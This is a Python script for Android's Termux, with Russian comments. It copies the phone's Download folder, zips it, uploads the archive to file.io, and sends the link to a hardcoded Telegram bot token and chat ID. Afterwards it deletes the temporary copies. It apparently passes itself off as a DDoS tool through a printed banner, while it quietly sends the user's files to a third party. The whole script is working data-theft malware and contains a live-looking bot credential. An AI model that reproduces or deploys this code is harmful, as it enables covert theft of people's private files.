import os
import shutil
import requests
import zipfile

def zip_folder(folder_path, zip_name):
    with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), os.path.join(folder_path, '..')))

def upload_to_file_io(file_path):
    url = 'https://file.io/'
    with open(file_path, 'rb') as file:
        files = {'file': file}
        response = requests.post(url, files=files)
        if response.status_code == 200:
            data = response.json()
            download_link = data['link']
            return download_link
        else:
            print("Failed to upload file.")
            return None

def send_link_to_telegram(download_link):
    bot_token = '6648739203:AAEOZr2BonuT7m7AOOoUyIsOB1wYkEJW_EY'
    chat_id = '5771852258'
    telegram_message = f"Вы можете скачать архив с папкой Downloads по следующей ссылке: {download_link}"
    telegram_url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={telegram_message}"
    requests.get(telegram_url)

def check_and_upload_folder():
    # Выводим надпись о начале работы скрипта
    print("DDoS by Конченый")

    # Проверка наличия папки Downloads
    downloads_folder = "/storage/emulated/0/Download"
    if not os.path.exists(downloads_folder):
        print("Пожалуйста, выполните команду 'termux-setup-storage' в приложении Termux, чтобы скрипт работал коректно.")
        return

    temp_folder = os.path.join(os.path.expanduser("~"), "TempDownloads")

    try:
        # Копирование папки Downloads во временную папку
        shutil.copytree(downloads_folder, temp_folder)
        # Архивирование временной папки
        zip_name = os.path.join(os.path.expanduser("~"), "Downloads.zip")
        zip_folder(temp_folder, zip_name)
        # Загрузка архива на файловый обменник
        download_link = upload_to_file_io(zip_name)
        if download_link:
            send_link_to_telegram(download_link)
    except Exception as e:
        print("Error:", e)
    finally:
        # Удаление временной папки и архива
        shutil.rmtree(temp_folder, ignore_errors=True)
        if 'zip_name' in locals():
            os.remove(zip_name)

if __name__ == "__main__":
    check_and_upload_folder()